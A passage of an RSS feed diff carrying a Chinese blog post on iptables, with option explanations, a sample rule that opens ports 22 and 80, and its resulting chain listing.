class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7. --log-prefix 记录时，将文本放在日志信息前&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8. --log-level 日志使用的系统日志级别，默认为7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9. -i 仅匹配来自特定接口的数据包&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10. -I 插入一条规则&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -I INPUT 5 插入INPUT链，使其成为第5条规则&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11. -v 在输出中显示更多信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12. -s --source - address[&amp;#x2F;mask] 指定源地址&amp;#x2F;掩码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13. -d --destination - address[&amp;#x2F;mask] 指定目的地&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;三-常用命令解析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三-常用命令解析&#34;&gt;#&lt;/a&gt; 三、常用命令解析&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;参考博客： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8zMzgyNzM1Mjg2ZTA=&#34;&gt;https://www.jianshu.com/p/3382735286e0&lt;/span&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZnJhbmtiL3AvNzQyNzk0NC5odG1s&#34;&gt;https://www.cnblogs.com/frankb/p/7427944.html&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;样例 1&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;iptables -I INPUT -d xx.xx.xx.x -p tcp -m multiport --dports 22,80 -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;结果&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Chain INPUT (policy ACCEPT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target     prot opt &lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;               destination&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ACCEPT     tcp  --  anywhere             xx.xx.xx.x.vultr.com  multiport dports ssh,http&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Chain FORWARD (policy ACCEPT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target     prot opt &lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;               destination&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Chain OUTPUT (policy ACCEPT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target     prot opt &lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;               destination&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;分析&lt;/p&gt;
+&lt;p&gt;向 &lt;code&gt;INPUT&lt;/code&gt;  链中添加了一条规则，接收目标地址为本机地址，端口为 22/80 的数据包，源地址没有指定&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;持久化保存规则 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2Fpc2hpcmVuc2hpL3AvMTEyMjc2NjMuaHRtbA==&#34;&gt;https://www.cnblogs.com/kaishirenshi/p/11227663.html&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;  我们的问题不在于电视为我们展示具有娱乐性的内容，而在于所有的内容都以娱乐的方式表现出来，这就完全是另外一回事了。&lt;/p&gt;
+&lt;p align=&#34;right&#34;&gt;——《娱乐至死》
+&lt;/blockquote&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
